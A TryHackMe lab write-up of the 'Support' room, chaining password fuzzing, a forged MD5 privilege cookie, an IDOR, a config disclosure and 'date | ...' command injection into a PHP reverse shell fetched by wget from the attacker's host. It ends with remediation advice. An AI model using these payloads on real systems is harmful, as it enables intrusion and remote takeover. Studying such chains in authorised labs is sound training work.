# Support Challenge
*[Image: Banner]*

**Pathway:** *Jr Penetration Tester* | **Section:** *Web Application Vulnerabilities II* | **Challenge:** *[Support](https://tryhackme.com/room/support)*

> [!IMPORTANT]
> **Spoiler warning:** This writeup contains part of exploitation chain, however no flag codes are shown in this writeup!
>
> **Please note:** The IP addresses shown in this writeup were allocated during the TryHackMe lab, with the attack performed from my own Kali Linux VM using OpenVPN connected to the TryHackMe VPN.
>
> **License:** Unless otherwise stated, all writeups and documentation in this repository are licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/). Any original scripts or code snippets are provided under the [MIT Licence](https://opensource.org/license/mit/).
> 
> This writeup uses several placeholders to avoid exposing lab-specific or sensitive information:
>
>: `<TARGET_IP>` - the IP address assigned to the target host when the TryHackMe machine is started.
>: `<TUN0_IP>` - the IP address assigned to my Kali Linux VM when connected to the TryHackMe VPN using OpenVPN.
>: `<REDACTED>` - information intentionally removed from the public writeup, such as flags, credentials, hashes or other challenge-sensitive values.
>
> This writeup reflects my own route through the challenge. Other learners may solve the room using different tools, commands or techniques. To preserve the integrity of the challenge and to act responsibly towards TryHackMe and the wider learning community, I choose what to redact from my public writeups unless I am asked by TryHackMe or another appropriate party to redact or remove additional material.

---

## About TryHackMe

This write-up was made possible by the hard work of the TryHackMe team and the wider cyber security community, who continue to create practical and engaging learning environments for aspiring security professionals.

[TryHackMe](http://www.tryhackme.com) is an online cyber security training platform that provides hands-on labs covering penetration testing, networking, web application security, privilege escalation and defensive security. Its rooms allow learners to develop practical technical skills within controlled and authorised environments.

## Lab Summary

A new internal **Support Operations Platform** has been deployed to assist IT and helpdesk teams. The application handles user management, internal APIs, and system-level operations. However, security was not the primary focus during development. Several features rely on user-controlled input and weak trust boundaries.

_Can you pentest the platform and escalate your access to achieve RCE on the server?_

Confirmed lab details used during the walkthrough:

    Target IP: <TARGET_IP>
    Kali tun0 IP: <TUN0_IP>
    Attacker working directory: /tmp/VK
## Tools Used

The main tools and techniques used were:

* `nmap` for initial service and port discovery.
* `dirbuster` for web content discovery.
* `ffuf` for credential-related fuzzing.
* `penelope` for receiving, managing and stabilising the reverse-shell session.
* Browser developer tools for cookie inspection and modification.
* Manual URL and API manipulation for access-control testing.
* Python's built-in HTTP server for hosting the reverse-shell payload.
* `wget` for retrieving the payload from the attacker-controlled web server.
* Standard Linux commands such as `whoami`, `id`, `ls` and `cat` for post-exploitation enumeration and validation.

Click [HERE](https://github.com/Valikahn/TryHackMe-Writeups#tools-commonly-used) to return to the repository README. Section `Tools Commonly Used` has all the links used and will be updated peredically with new tools if used or if links needs become 404.

## Initial Enumeration

The assessment began with an Nmap scan of the target:

```bash
nmap -sC -sV -Pn <TARGET_IP>
```

The scan identified two externally accessible services:

```text
22/tcp  open  ssh
80/tcp  open  http
```

The HTTP service on port `80` hosted the Support Operations Platform.

## Web Content Discovery

DirBuster was used to enumerate files and directories exposed by the web server.

The tool was launched from the terminal using:

```text
dirbuster
```

The following scan configuration was then entered into the DirBuster interface:

```text
Target URL: http://<TARGET_IP>/
Wordlist: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

The scan identified several potentially interesting paths:

```text
/info.php
/skins
/includes
/api.php
/config.php
/dashboard.php
```

These findings indicated that the application exposed multiple PHP endpoints and supporting directories associated with system information, configuration data, API functionality and the administrative dashboard.

The discovered endpoints were recorded for further manual inspection and testing.

## Identifying the Support Account

Browsing to the root of the web application redirected to the login page:

```text
http://<TARGET_IP>/
```

Inspection of the page content revealed a valid support email address:

```text
<REDACTED>
```

The password field was then fuzzed using `ffuf`. The known email address was supplied in each request, while the `FUZZ` keyword was placed within the password parameter:

```text
ffuf -w /usr/share/wordlists/rockyou.txt \
-u http://<TARGET_IP>/ \
-X POST \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "email=<REDACTED>&password=FUZZ" \
-fr "Invalid"
```

The command used the following options:

```text
-w    Specifies the password wordlist.
-u    Defines the target login URL.
-X    Sends each request using the POST method.
-H    Sets the request content type.
-d    Supplies the email address and fuzzes the password parameter.
-fr   Filters responses containing the failed-login message.
```

The `-fr` filter removed responses containing the word `Invalid`, making the successful authentication response easier to identify. The filter value should match the exact failure message returned by the login page.

A response with a different size, word count, status code or redirect behaviour indicated a potentially valid password.

The discovered credential is intentionally redacted:

```text
Email: <REDACTED>
Password: <REDACTED>
```

The credentials were verified manually through the login page, providing access to the support dashboard.

## Manipulating the `isITuser` Cookie

Browser developer tools were used to inspect the cookies created by the application.

An interesting cookie named `isITuser` was present. Its value was not stored as a plain Boolean value; instead, it was represented by an MD5 hash.

The original value corresponded to `false`. Because the application trusted this client-controlled cookie, it was replaced with the MD5 representation of `true`.

After refreshing the application, additional functionality became available.

This demonstrated a broken access-control weakness because the server relied on a user-modifiable client-side value to decide whether privileged functionality should be displayed or accessed.

## Discovering the Internal User API

Following the cookie modification, a new endpoint became visible from the application homepage. This endpoint redirected to an internal user API.

Testing the API revealed an insecure direct object reference vulnerability. By modifying the user reference supplied to the endpoint, records belonging to other users could be retrieved without appropriate authorisation.

The administrator's email address was disclosed through this flaw.

```text
Administrator email: <REDACTED>
```

## Configuration Disclosure

Further manual testing was performed against the application routes.

Appending a traversal-style path to the URL caused the page content and interface to change:

```text
../config
```

The source code of the resulting page was inspected. A master password for the Support Operations Platform was exposed directly within the returned content.

The disclosed password is redacted:

```text
Master password: <REDACTED>
```

Exposing secrets in client-accessible source code or responses allows attackers to bypass authentication controls without needing to compromise the underlying server first.

## Administrator Access

Several login attempts were made using the administrator email address and the disclosed master password.

The login initially failed. Testing showed that authentication succeeded only after removing the `@` character from the discovered password.

The working credential is intentionally redacted:

```text
Administrator email: <REDACTED>
Password: <REDACTED>
```

Successful authentication provided access to the administrator dashboard.

The first flag was displayed after logging in as the administrator:

```text
THM{....}
```

## Discovering the Time API

After administrator access was obtained, a time widget appeared in the application interface.

Inspection of the page source revealed PHP-related information and a path associated with the application's database.

Changing the date or time through the widget generated a request to an API endpoint. Initial testing showed that the endpoint expected date-related input.

A basic command such as `ls` was rejected because the endpoint attempted to restrict input to date functions.

## Command Injection

The administrator dashboard contained a date and time widget that submitted user-controlled input to the application's API gateway.

When a normal value was supplied, the API appeared to execute the Linux `date` command on the server. Entering an unrelated command such as `ls` by itself was rejected because the application expected the input to begin with a permitted date-related command.

The request parameter used by the API was named `sys`. A normal request therefore resembled:

```text
sys: date
```

To test whether the value was being passed to an operating-system shell, a pipe character was added after the permitted `date` command:

```text
sys: date | ls
```

In a Linux shell, the pipe character (`|`) connects two commands. The first command, `date`, satisfied the application's basic validation, while the second command, `ls`, was interpreted and executed by the server's shell.

The API response returned a listing of files and directories from the server, confirming that the injected `ls` command had executed successfully.

Additional commands could then be supplied using the same format:

```text
sys: date | whoami
```

```text
sys: date | pwd
```

```text
sys: date | cat /home/ubuntu/user.txt
```

The vulnerability existed because the application included the user-controlled `sys` value within an operating-system command without safely separating the input from the shell interpreter. The validation checked that the value contained an expected date command, but it did not prevent shell metacharacters such as the pipe character from being included.

This resulted in operating-system command injection and allowed arbitrary commands to be executed with the privileges of the web application service account.

## Reading the User Flag

The previously disclosed database path and the vulnerable API gateway were used to continue enumeration.

Through command injection, the contents of the user flag file were retrieved:

```text
cat /home/ubuntu/user.txt
```

Flag:

```text
THM{....}
```

This confirmed that arbitrary commands could access files outside the intended functionality of the date API.

## Establishing a Reverse Shell

To demonstrate full remote code execution, a PHP reverse-shell payload was prepared in the Kali Linux working directory:

```text
/tmp/VK
```

The payload was configured to connect back to the Kali Linux `tun0` interface:

```text
<TUN0_IP>
```

TCP port `4444` was selected for the reverse-shell connection.

The relevant callback values within the PHP reverse shell were configured as follows:

```php
$ip = '<TUN0_IP>';
$port = 4444;
```

Instead of using a basic Netcat listener, Penelope was used to receive and manage the incoming reverse shell.

From the `/tmp/VK` working directory, Penelope was started on port `4444`:

```text
cd /tmp/VK
```

```text
penelope -p 4444
```

A Python HTTP server was then started from the directory containing the PHP reverse-shell payload:

```text
cd /tmp/VK
```

```text
python3 -m http.server 1234
```

This made the payload available to the target at:

```text
http://<TUN0_IP>:1234/revshell.php
```

The command-injection vulnerability in the API gateway was then used to download the PHP payload to the target:

```text
sys: date | wget http://<TUN0_IP>:1234/revshell.php -O /tmp/revshell.php
```

The downloaded payload was executed through a second injected command:

```text
sys: date | php /tmp/revshell.php
```

Once the PHP payload executed, the target connected back to Penelope on the Kali Linux machine.

Penelope received the reverse-shell session on:

```text
<TUN0_IP>:4444
```

The resulting session confirmed that the command-injection vulnerability could be escalated into interactive remote code execution on the target server.
## Post-Exploitation

After the PHP reverse-shell payload executed, Penelope received the incoming connection on the Kali Linux `tun0` address:

```text
<TUN0_IP>:4444
```

Penelope automatically handled the reverse-shell session and provided a more stable interactive shell than a basic Netcat listener.

The current user and execution context were verified using:

```text
whoami
```

```text
id
```

The target hostname and current working directory were then identified:

```text
hostname
```

```text
pwd
```

The filesystem was enumerated to confirm access and identify files available to the compromised web application account:

```text
ls -la
```

The user flag was stored at:

```text
/home/ubuntu/user.txt
```

Its contents were retrieved using:

```text
cat /home/ubuntu/user.txt
```

The flag value has been redacted:

```text
THM{....}
```

Successfully reading the file through the Penelope-managed shell confirmed that the command-injection vulnerability had been escalated into interactive remote code execution and that the compromised account could access sensitive files on the target system.

## Full Attack Chain Recap

### 1. Service Enumeration

An Nmap scan identified two externally accessible services on the target:

```text
22/tcp - SSH
80/tcp - HTTP
```

The HTTP service hosted the Support Operations Platform.

### 2. Web Content Discovery

DirBuster was used to enumerate exposed files and directories.

The scan identified several potentially useful paths:

```text
/info.php
/skins
/includes
/api.php
/config.php
/dashboard.php
```

These endpoints provided additional areas for manual inspection and testing.

### 3. Support Account Identification

Inspection of the login page revealed a valid support email address:

```text
<REDACTED>
```

The password field was fuzzed using `ffuf`, and a valid password was discovered.

The password is intentionally redacted:

```text
Password: <REDACTED>
```

The credentials were then used to authenticate to the support dashboard.

### 4. Cookie-Based Privilege Manipulation

Browser developer tools revealed a cookie named `isITuser`.

The cookie contained an MD5 hash representing the Boolean value `false`. The value was replaced with the MD5 hash for `true`.

After refreshing the application, additional privileged functionality became available.

This confirmed that the application relied on a client-controlled cookie to determine whether a user should receive elevated access.

### 5. Internal API Discovery

The modified cookie exposed access to an internal user API.

Testing the API revealed an insecure direct object reference vulnerability. By changing the user identifier within the request, information belonging to other users could be retrieved without proper authorisation.

This exposed the administrator's email address.

### 6. Configuration Disclosure

Further testing of the application routes identified a configuration-related path using:

```text
../config
```

The returned page source exposed a master password for the Support Operations Platform.

The password is intentionally redacted:

```text
Master password: <REDACTED>
```

### 7. Administrator Access

The administrator email address and disclosed password were tested against the login page.

Authentication initially failed. Removing the `@` character from the discovered password allowed the login to succeed.

The working password is redacted:

```text
Password: <REDACTED>
```

Successful administrator authentication revealed the first flag:

```text
THM{....}
```

### 8. Command Injection

The administrator dashboard contained a date and time widget that submitted input to the application's API gateway.

The API expected a date-related command such as:

```text
sys: date
```

The input validation was bypassed by appending a pipe character followed by another operating-system command:

```text
sys: date | ls
```

The `date` command satisfied the application's basic validation, while the pipe character caused the server shell to execute the appended `ls` command.

The returned directory listing confirmed operating-system command injection.

### 9. Sensitive File Access

The command-injection vulnerability was used to read the user flag directly:

```text
sys: date | cat /home/ubuntu/user.txt
```

The returned flag has been redacted:

```text
THM{....}
```

### 10. Reverse-Shell Delivery

A PHP reverse-shell payload was prepared in the Kali Linux working directory:

```text
/tmp/VK
```

The payload was configured to connect back to the Kali Linux `tun0` address:

```text
<TUN0_IP>
```

A Python HTTP server was started on port `1234` to host the payload:

```text
cd /tmp/VK
python3 -m http.server 1234
```

The vulnerable API was then used to download the payload onto the target:

```text
sys: date | wget http://<TUN0_IP>:1234/revshell.php -O /tmp/revshell.php
```

The payload was executed using:

```text
sys: date | php /tmp/revshell.php
```

### 11. Penelope Reverse Shell

Penelope was used instead of Netcat to receive and manage the reverse-shell connection.

Penelope listened on TCP port `4444`:

```text
penelope -p 4444
```

When the payload executed, the target connected back to:

```text
<TUN0_IP>:4444
```

The resulting Penelope-managed session provided interactive remote command execution on the target.

### 12. Post-Exploitation

The compromised execution context was confirmed using:

```text
whoami
id
hostname
pwd
```

The filesystem was then enumerated:

```text
ls -la
```

The user flag was retrieved from:

```text
cat /home/ubuntu/user.txt
```

The flag value is redacted:

```text
THM{....}
```

This completed the attack chain from initial web enumeration to interactive remote code execution.

## Key Lessons

1. This room demonstrated how several individually significant weaknesses can be chained together to achieve full system compromise.
2. The `isITuser` weakness showed that security decisions must not depend on values stored entirely on the client. Hashing a Boolean value did not protect it from modification because the browser user retained complete control over the cookie.
3. The internal API demonstrated the importance of object-level authorisation. Authentication alone was insufficient because the application did not verify whether the authenticated user was permitted to access the requested user record.
4. The configuration disclosure showed the danger of exposing secrets within application source code or client-accessible responses. Once the master password was disclosed, the effectiveness of the login controls was substantially reduced.
5. The inconsistent handling of the `@` character also demonstrated that password-processing logic must be predictable and secure. Silent character removal or transformation can create unexpected authentication bypass conditions.
6. The command-injection vulnerability was the most serious weakness in the chain. The application attempted to restrict input to date-related commands, but it failed to prevent shell metacharacters such as the pipe character.
7. Allowing user-controlled input to reach a system shell enabled the execution of arbitrary operating-system commands. This ultimately allowed sensitive file access and the delivery of a reverse-shell payload.
8. The use of Penelope demonstrated the operational advantage of a dedicated reverse-shell handler. It provided a more manageable interactive session than a basic raw listener and simplified post-exploitation activity.
9. The overall attack path also reinforced an important penetration-testing principle: seemingly unrelated vulnerabilities can become critical when combined. Weak session trust, broken access control, credential exposure and command injection formed a complete route from unauthenticated access to remote code execution.

## Remediation Notes

* The `isITuser` cookie should not be used as the authoritative source for privilege decisions. User roles and permissions should be stored server-side and associated with a securely managed authenticated session.
* Any client-side session data should be cryptographically signed and validated. However, signed cookies should not replace server-side authorisation checks on protected endpoints.
* The internal user API should enforce object-level authorisation for every request. The server must verify both the identity of the requester and whether that user is permitted to access the requested object.
* Sequential or predictable identifiers should not be treated as an access-control mechanism. Even where non-predictable identifiers are used, explicit authorisation checks remain necessary.
* Configuration files, source code and API responses must not expose passwords, database locations or other sensitive values. Secrets should be stored in protected environment variables or an appropriate secrets-management platform.
* Any credentials exposed during development or testing should be rotated immediately. Application logs should also be reviewed to determine whether the credentials were previously accessed or misused.
* Password-processing logic should preserve the exact user-supplied password unless a clearly documented normalisation policy is required. Special characters must not be silently removed or altered during authentication.
* The date and time feature should be rewritten to use a safe language-level date library rather than invoking operating-system commands.
* Where an external executable is genuinely required, the application should call it using a fixed executable path and a structured argument array. User input must never be concatenated into a shell command string.
* Shell invocation should be avoided entirely wherever possible. Input allow-listing may provide additional defence, but it should not be relied upon as the primary control where shell interpretation remains possible.
* Potential shell metacharacters, including the following, should be rejected as a secondary safeguard:

```text
|
;
&
`
$
>
<
```

* The web application should run under a dedicated, low-privileged operating-system account with access only to the files and services required for normal operation.
* Sensitive files such as `/home/ubuntu/user.txt` should not be readable by the web application service account.
* Outbound network access from the web server should be restricted. Egress filtering could prevent or limit reverse-shell connections to attacker-controlled systems.
* Security monitoring should be configured to detect suspicious process creation, use of utilities such as `wget`, unexpected PHP execution and outbound connections from the web service.
* Application and web server logs should be monitored for traversal strings, manipulated user identifiers, shell metacharacters and anomalous API requests.  

Finally, the application should undergo secure code review and penetration testing before deployment. Particular attention should be given to authentication, session management, API authorisation, secret storage and any functionality that interacts with the operating system.

## Disclaimer

This writeup is intended solely for education, training and documentation of an authorised TryHackMe lab.

All tools, commands, payloads and post-exploitation techniques described here were used within a controlled environment provided by TryHackMe. Permission to interact with the target was granted by the platform owner and operator as part of the room.

The tools and methods documented in this walkthrough represent one successful approach. They are not the only possible techniques, and alternative tools or workflows may produce the same result.

Never test, scan, exploit or access a system without clear and explicit authorisation from its owner.

---
[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://buymeacoffee.com/v4l1k4hn)  

**Powered on ☕ made with ❤️ by [V4L1K4HN](https://tryhackme.com/p/V4L1K4HN)**  
⭐ If this project is useful, consider starring it on GitHub.
